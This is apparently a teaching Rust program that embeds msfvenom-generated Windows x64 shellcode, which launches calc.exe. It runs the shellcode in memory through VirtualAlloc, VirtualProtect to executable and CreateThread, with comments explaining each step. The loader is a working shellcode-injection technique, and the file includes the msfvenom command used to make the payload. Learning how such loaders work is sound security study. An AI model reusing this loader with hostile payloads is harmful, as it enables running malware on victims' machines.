/*
    Simple Payload Execution With Explanation.
    Pov: Just wrote this program for teaching my friends about how shellcode works and executes when it comes to windows. 
    @5mukx
*/

// Importing winapi from crates 

use std::ptr::{copy, null_mut};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("[-] {}", format!($msg, $($arg), *));
        return;
    }
}

macro_rules! okey {
    ($msg:expr) => {
        println!("[+] {}", format!($msg));
    }
}

fn main() {
    // Generating sample calc shellcode using metasploit
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    let shellcode: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
    ];
    
    /* 
    Why unsafe ? : some operations require bypassing these safety checks for low-level 
    memory manipulation, interacting with hardware, or calling foreign functions (e.g., WinAPI in this case).
    */
    unsafe {
        
        okey!("Allocating memory for the shellcode with read/write permissions");
        let shellcode_addr = VirtualAlloc(
            null_mut(),                   // address hint (nullptr means the system chooses the address)
            shellcode.len(),              // size of the memory block
            MEM_COMMIT | MEM_RESERVE,     // allocation type
            PAGE_READWRITE,               // memory protection
        );

        // checking if memory allocation was successful
        if shellcode_addr.is_null() {
            error!("VirtualAlloc failed {}", GetLastError());
        }
        
        println!("[+] Shellcode Addr: {:?}", shellcode_addr);
        
        okey!("Copy the shellcode to the allocated memory");
        copy(shellcode.as_ptr(), shellcode_addr as *mut u8, shellcode.len());

        okey!("Change the memory protection to executable");

        let mut old_protection = 0;
        
        let virtualprotect = VirtualProtect(
            shellcode_addr, // Starting Page Address
            shellcode.len(), // Shellcode size
            PAGE_EXECUTE_READWRITE, // Memory protection Option , Either Exec, Read, or Readwrite
            &mut old_protection // Previous protection 
        );
        
        if virtualprotect == 0 {
            error!("VirtualProtect failed {}", GetLastError());
        }

        okey!("Creating thread to execute the shellcode");
        
        let hthread = CreateThread(
            null_mut(),                   // Security attributes
            0,                                  // Stack size (0 means default)
            Some(std::mem::transmute(shellcode_addr)),  // Thread start address
            null_mut(),                         // Thread parameter
            0,                              // Creation flags
            null_mut(),                         // Thread ID
        );

        println!("Thread Address: {:?}", hthread);

        if hthread.is_null() {
            error!("[!] CreateThread failed {}", GetLastError());
        }

        // waiting for the created thread to finish execution
        okey!("[+] Shellcode Executed!");
        WaitForSingleObject(hthread, 0xFFFFFFFF); // 0xFFFFFFFF means to wait for INFINITE times ..! 
    }
}

